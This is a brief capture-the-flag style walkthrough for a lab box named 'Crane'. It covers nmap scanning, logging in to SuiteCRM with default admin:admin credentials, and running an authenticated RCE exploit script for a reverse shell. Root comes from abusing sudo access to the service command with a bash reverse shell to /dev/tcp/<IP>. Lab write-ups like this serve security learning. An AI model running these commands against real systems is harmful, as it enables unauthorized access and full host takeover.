# Crane
> SuiteCRM RCE + sudo service

## Enumeration

```
nmap -sC -sV -oN nmap.txt <IP>
```

SuiteCRM identified on port 80.

## Exploitation

Default credentials `admin:admin` work. SuiteCRM version vulnerable to authenticated RCE:

```
searchsploit suitecrm
```

Webshell upload via reports module or public exploit:

```
python3 exploit.py -u http://<IP> --user admin --pass admin --lhost <IP> --lport <PORTA>
```

Reverse shell as www-data.

## Privilege Escalation

```
sudo -l
```

```
(root) NOPASSWD: /usr/sbin/service
```

Controllable service execution:

```
TF=$(mktemp).sh
echo '#!/bin/bash\nbash -i >& /dev/tcp/<IP>/<PORTA> 0>&1' > $TF
chmod +x $TF
sudo service ../../tmp/$(basename $TF) start
```

Root obtained.
